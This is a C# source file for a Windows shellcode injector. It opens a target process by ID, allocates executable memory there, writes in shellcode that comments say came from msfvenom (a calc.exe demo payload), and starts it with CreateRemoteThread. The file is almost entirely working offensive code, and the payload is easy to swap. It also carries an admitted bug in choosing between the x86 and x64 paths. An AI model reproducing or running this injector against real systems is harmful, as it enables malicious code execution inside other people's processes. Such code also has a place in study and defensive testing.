using System;
using System.Linq;
using System.Runtime.InteropServices;
using static ShellcodeInjection.Imports;

namespace ShellcodeInjection
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Please enter a process ID...");
                Console.WriteLine("Usage: shellcodeinjection.exe [process id]");
                return;
            }

            var desiredAccess = Process.PROCESS_CREATE_THREAD | Process.PROCESS_QUERY_INFORMATION | Process.PROCESS_VM_OPERATION | Process.PROCESS_VM_READ | Process.PROCESS_VM_WRITE;

            // msfvenom -p windows/exec CMD=calc.exe -f csharp
            byte[] x86_shellcode = ConvertToByteArray(Properties.Resources.cleanx86);

            // msfvenom - p windows/x64/exec CMD = calc.exe - f csharp
            byte[] x64_shellcode = ConvertToByteArray(Properties.Resources.cleanx64);

            IntPtr procHandle = OpenProcess((uint)desiredAccess, false, Convert.ToUInt32(args[0]));

            // currently only runs x64 shell code so the process needs to be x64. Need to fix this.
            if (IntPtr.Size == 8)
            {
                int shellcode_size = x64_shellcode.Length;
                int bytesWritten = 0;
                int lpthreadIP = 0;

                IntPtr init = VirtualAllocEx(procHandle, IntPtr.Zero, shellcode_size, (uint)State.MEM_COMMIT | (uint)State.MEM_RESERVE, (uint)Protection.PAGE_EXECUTE_READWRITE);
                WriteProcessMemory(procHandle, init, x64_shellcode, shellcode_size, ref bytesWritten);
                IntPtr threadPTR = CreateRemoteThread(procHandle, IntPtr.Zero, 0, init, IntPtr.Zero, 0, ref lpthreadIP);
            }

            else if (IntPtr.Size != 8)
            {
                int shellcode_size = x86_shellcode.Length;
                int bytesWritten = 0;
                int lpthreadIP = 0;

                IntPtr init = VirtualAllocEx(procHandle, IntPtr.Zero, shellcode_size, (uint)State.MEM_COMMIT | (uint)State.MEM_RESERVE, (uint)Protection.PAGE_EXECUTE_READWRITE);
                WriteProcessMemory(procHandle, init, x86_shellcode, shellcode_size, ref bytesWritten);
                IntPtr threadPTR = CreateRemoteThread(procHandle, IntPtr.Zero, 0, init, IntPtr.Zero, 0, ref lpthreadIP);
            }
        }

        public static byte[] ConvertToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length).Where(x => x % 2 == 0)
                .Select(x => Convert.ToByte(hex.Substring(x, 2), 16)).ToArray();
        }
    }

    class Imports
    {
        #region imports
        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref int lpThreadId);
        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref int lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, bool bInheritHandle, UInt32 dwProcessId);
        #endregion

        #region const
        public enum State
        {
            MEM_COMMIT = 0x00001000,
            MEM_RESERVE = 0x00002000
        }

        public enum Protection
        {
            PAGE_EXECUTE_READWRITE = 0x40
        }
        public enum Process
        {
            PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFFF,
            PROCESS_CREATE_THREAD = 0x0002,
            PROCESS_QUERY_INFORMATION = 0x0400,
            PROCESS_VM_OPERATION = 0x0008,
            PROCESS_VM_READ = 0x0010,
            PROCESS_VM_WRITE = 0x0020
        }
        #endregion
    }
}